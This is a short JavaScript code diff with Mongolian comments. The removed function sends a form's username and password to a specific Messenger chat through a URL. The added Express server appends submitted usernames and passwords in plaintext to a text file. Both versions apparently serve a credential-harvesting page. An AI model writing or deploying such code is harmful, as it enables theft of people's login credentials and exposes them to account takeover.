@@ -1,13 +1,27 @@
-function sendToMessenger() {
-    const username = document.getElementById('username').value; // Нэвтрэх нэр
-    const password = document.getElementById('password').value; // Нууц үг
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
 
-    // "Tulip Tulip" ID-тэй Messenger хаяг руу илгээх текст
-    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;
+const app = express();
+const PORT = 3000;
 
-    // Messenger руу илгээх URL
-    const messengerUrl = `https://www.messenger.com/e2ee/t/27808255922107117?text=${encodeURIComponent(message)}`;
+// Middleware
+app.use(express.json());
+app.use(express.static('public')); // HTML, JS файлууд байрлах хавтас
 
-    // Шинэ таб нээнэ
-    window.open(messengerUrl, '_blank');
-}
+app.post('/save', (req, res) => {
+    const { username, password } = req.body;
+    const data = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}\n`;
+
+    fs.appendFile(path.join(__dirname, 'text.txt'), data, (err) => {
+        if (err) {
+            console.error('Файлд бичих алдаа:', err);
+            return res.status(500).json({ message: 'Файлд бичих алдаа' });
+        }
+        res.json({ message: 'Мэдээлэл амжилттай хадгалагдлаа.' });
+    });
+});
+
+app.listen(PORT, () => {
+    console.log(`Сервер http://localhost:${PORT} дээр ажиллаж байна`);
+});
